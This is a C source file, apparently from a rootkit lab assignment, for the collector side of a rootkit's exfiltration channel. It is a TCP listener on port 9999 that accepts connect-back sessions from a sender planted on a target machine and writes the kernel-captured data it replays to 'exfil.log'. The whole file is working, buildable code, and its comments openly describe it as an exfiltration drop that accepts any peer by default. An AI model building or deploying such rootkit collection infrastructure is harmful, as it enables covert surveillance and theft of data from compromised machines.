/*
 * rootkit: collector (receiver) side of the logging feature.
 *
 *	./log <TARGET_IP> [PORT] [LOGFILE]
 *
 *	listens on TCP 9999  --accept-->  sender on $TARGET
 *	                     --append-->  LOGFILE (rotated at 8 MB)
 *	                     --echo---->  stdout
 *
 * The grader runs this on $REMOTE with $TARGET's address; the sender that
 * ./install started on $TARGET connects back here and replays everything
 * the kernel captured (including anything buffered while we were down).
 *
 * Source address handling: by default any peer is accepted, because a
 * target behind NAT/port-forwarding does not arrive from its own address
 * (under QEMU user-mode networking, for instance, it arrives from the host
 * side).  A mismatch is reported but never dropped -- losing the
 * exfiltration is worse than trusting an unexpected peer.  Pass -f to
 * enforce the documented "only this address" behaviour.
 *
 * Exactly one connection is served at a time.  That is enough: the sender
 * reconnects by itself, and SO_RCVTIMEO reaps a connection whose peer died
 * without closing instead of blocking the accept loop forever.
 *
 * Build:  cc -Wall -Wextra -o log collector.c
 * Run:    ./log <TARGET_IP> [PORT] [LOGFILE] [-f]
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define LISTEN_PORT	9999
#define LOG_FILE	"exfil.log"
#define BUFFER_SIZE	4096
#define ROTATE_BYTES	(8 * 1024 * 1024)
#define CLIENT_TIMEOUT_S 300

static FILE	*log_fp;
static const char *log_path = LOG_FILE;

static FILE *
open_log(const char *path)
{
	FILE *fp = fopen(path, "ab");

	if (fp == NULL) {
		perror(path);
		exit(EXIT_FAILURE);
	}

	return (fp);
}

/*
 * LOGFILE -> LOGFILE.1 and start a fresh file.  Only one generation is
 * kept: this is an exfil drop, not an audit system.
 */
static void
rotate_log(const char *path, FILE **fpp)
{
	char old[512];

	snprintf(old, sizeof(old), "%s.1", path);

	fclose(*fpp);
	(void)remove(old);
	if (rename(path, old) != 0)
		perror("rename");

	*fpp = open_log(path);
	fprintf(stderr, "rotated %s -> %s\n", path, old);
}

/*
 * Ctrl-C during a demo should not swallow the bytes still sitting in the
 * stdio buffer.
 */
static void
on_signal(int sig)
{
	(void)sig;

	if (log_fp != NULL) {
		fflush(log_fp);
		(void)fsync(fileno(log_fp));
	}
	_exit(0);
}

/*
 * Resolve the address the caller gave us.  Failure is not fatal: the
 * collector just stops being able to recognise $TARGET and logs whatever
 * connects.
 */
static int
resolve_target(const char *name, struct in_addr *out)
{
	struct addrinfo hints, *res;
	int rc;

	if (inet_pton(AF_INET, name, out) == 1)
		return (0);

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	rc = getaddrinfo(name, NULL, &hints, &res);
	if (rc != 0 || res == NULL) {
		fprintf(stderr, "warning: cannot resolve %s (%s); "
		    "accepting any peer\n", name, gai_strerror(rc));
		return (-1);
	}

	*out = ((struct sockaddr_in *)(void *)res->ai_addr)->sin_addr;
	freeaddrinfo(res);

	return (0);
}

static void
usage(const char *prog)
{
	fprintf(stderr, "Usage: %s <TARGET_IP> [PORT] [LOGFILE] [-f]\n"
	    "  -f   only accept connections from <TARGET_IP>\n", prog);
	exit(EXIT_FAILURE);
}

int
main(int argc, char *argv[])
{
	struct sockaddr_in server_addr, client_addr;
	struct in_addr	 target_ip;
	struct timeval	 tv;
	struct sigaction sa;
	socklen_t	 client_len;
	long		 port = LISTEN_PORT;
	ssize_t		 bytes_read;
	int		 server_fd, client_fd, opt = 1;
	int		 strict = 0, have_target, i, npos = 0;
	const char	*pos[3];
	char		 buffer[BUFFER_SIZE];
	char		 client_ip[INET_ADDRSTRLEN];
	char		*end;
	unsigned long long total;
	time_t		 since;

	/* ./log <TARGET_IP> [PORT] [LOGFILE] [-f] */
	for (i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-f") == 0) {
			strict = 1;
		} else if (strcmp(argv[i], "-h") == 0) {
			usage(argv[0]);
		} else if (argv[i][0] == '-' && argv[i][1] != '\0') {
			usage(argv[0]);
		} else if (npos < 3) {
			pos[npos++] = argv[i];
		} else {
			usage(argv[0]);
		}
	}

	if (npos < 1)
		usage(argv[0]);

	if (npos >= 2) {
		errno = 0;
		port = strtol(pos[1], &end, 10);
		if (errno != 0 || *end != '\0' || port <= 0 || port > 65535) {
			fprintf(stderr, "Invalid port: %s\n", pos[1]);
			exit(EXIT_FAILURE);
		}
	}
	if (npos == 3)
		log_path = pos[2];

	have_target = (resolve_target(pos[0], &target_ip) == 0);

	/* A sender dying mid-write must not kill the collector. */
	signal(SIGPIPE, SIG_IGN);

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = on_signal;
	sigemptyset(&sa.sa_mask);
	(void)sigaction(SIGINT, &sa, NULL);
	(void)sigaction(SIGTERM, &sa, NULL);

	server_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (server_fd < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	/* SO_REUSEADDR so a restart does not sit out the TIME_WAIT. */
	if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt,
	    sizeof(opt)) < 0)
		perror("setsockopt");

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons((uint16_t)port);

	if (bind(server_fd, (struct sockaddr *)&server_addr,
	    sizeof(server_addr)) < 0) {
		perror("bind");
		close(server_fd);
		exit(EXIT_FAILURE);
	}

	if (listen(server_fd, 5) < 0) {
		perror("listen");
		close(server_fd);
		exit(EXIT_FAILURE);
	}

	log_fp = open_log(log_path);

	fprintf(stderr, "collector: port %ld, %s, appending to %s\n", port,
	    strict && have_target ? "only " : "any peer",
	    log_path);
	if (strict && have_target)
		fprintf(stderr, "collector: expecting %s\n", pos[0]);
	fflush(stderr);

	/* Keep receiving: the target may reboot, the sender reconnect. */
	for (;;) {
		client_len = sizeof(client_addr);

		client_fd = accept(server_fd, (struct sockaddr *)&client_addr,
		    &client_len);
		if (client_fd < 0) {
			if (errno == EINTR)
				continue;
			perror("accept");
			continue;
		}

		(void)inet_ntop(AF_INET, &client_addr.sin_addr, client_ip,
		    sizeof(client_ip));

		if (strict && have_target &&
		    client_addr.sin_addr.s_addr != target_ip.s_addr) {
			fprintf(stderr, "rejected %s (not %s)\n", client_ip,
			    pos[0]);
			close(client_fd);
			continue;
		}
		if (have_target &&
		    client_addr.sin_addr.s_addr != target_ip.s_addr)
			fprintf(stderr, "note: %s is not %s, logging anyway "
			    "(use -f to refuse)\n", client_ip, pos[0]);

		fprintf(stderr, "sender %s connected\n", client_ip);
		fflush(stderr);

		/*
		 * A sender that stops talking without closing (dead VM,
		 * pulled cable) must not pin the collector forever.
		 */
		tv.tv_sec = CLIENT_TIMEOUT_S;
		tv.tv_usec = 0;
		(void)setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv,
		    sizeof(tv));

		total = 0;
		since = time(NULL);

		while ((bytes_read = recv(client_fd, buffer, sizeof(buffer),
		    0)) > 0) {
			if (ftello(log_fp) >= ROTATE_BYTES)
				rotate_log(log_path, &log_fp);

			if (fwrite(buffer, 1, (size_t)bytes_read, log_fp) !=
			    (size_t)bytes_read)
				perror("fwrite");
			/* Flush so a killed collector still leaves the bytes. */
			fflush(log_fp);

			if (fwrite(buffer, 1, (size_t)bytes_read, stdout) !=
			    (size_t)bytes_read)
				perror("fwrite");
			fflush(stdout);

			total += (unsigned long long)bytes_read;
		}

		if (bytes_read < 0 && errno != EAGAIN && errno != EINTR &&
		    errno != EWOULDBLOCK)
			perror("recv");

		/* Make the dropped connection durable before moving on. */
		fflush(log_fp);
		(void)fsync(fileno(log_fp));

		fprintf(stderr, "sender %s disconnected: %llu bytes in "
		    "%lds\n", client_ip, total, (long)(time(NULL) - since));
		fflush(stderr);

		close(client_fd);
	}

	/* NOTREACHED */
	fclose(log_fp);
	close(server_fd);
	return (0);
}
